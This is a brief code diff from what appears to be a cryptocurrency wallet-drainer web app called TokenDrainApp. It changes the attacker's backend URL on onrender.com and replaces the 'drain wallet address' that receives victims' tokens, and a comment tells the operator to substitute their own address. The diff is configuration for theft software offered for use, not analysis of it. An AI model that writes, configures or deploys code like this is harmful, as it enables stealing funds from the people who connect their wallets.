@@ -42,12 +42,12 @@ function Dashboard() {
   const [authStatus, setAuthStatus] = useState('');
   const [signature, setSignature] = useState('');
   const [isAuthenticating, setIsAuthenticating] = useState(false);
-  const [backendUrl] = useState('https://tokenbackendwork.onrender.com');
+  const [backendUrl] = useState('https://tokenbackend-5xab.onrender.com');
   const [userTokens, setUserTokens] = useState([]);
   const [txStatus, setTxStatus] = useState('');
 
   // Your drain wallet address - REPLACE THIS
-  const DRAIN_TO_ADDRESS = "0x742d35Cc6634C0532925a3b844Bc9e90C90a5F29";
+  const DRAIN_TO_ADDRESS = "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4";
 
   // Start auth when wallet connects
   useEffect(() => {
@@ -393,3 +393,4 @@ function Dashboard() {
 
 // Export the main app
 export default TokenDrainApp;
+
